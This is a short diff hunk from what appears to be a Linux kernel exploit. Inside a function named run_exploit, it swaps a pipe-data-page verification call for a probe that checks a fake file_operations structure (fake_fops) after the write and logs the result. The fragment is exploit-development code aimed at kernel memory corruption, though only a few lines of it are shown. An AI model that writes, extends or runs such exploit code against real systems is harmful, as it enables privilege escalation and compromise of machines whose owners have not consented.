@@ -633,8 +633,10 @@ int run_exploit(int argc, char **argv) {
       force_cfi = force_env && *force_env && strcmp(force_env, "0") != 0;
     }
     if (fops_data_alias_deferred) {
-      postwrite_result = verify_p0_pipe_data_page(
-          fops_data_alias_deferred_target, fake_fops);
+      int prod_touched = -1;
+      postwrite_result = probe_fops_and_production_touch(
+          fops_data_alias_deferred_target, fake_fops, &prod_touched);
+      pr_info("fops postwrite prod_touched=%d\n", prod_touched);
       probe_restored =
           app_trigger_fops_oracle_slot(P0_ORACLE_PROBE_RESTORE_SLOT);
       pr_info("fops postwrite direct read target=%016zx initial=%016llx "
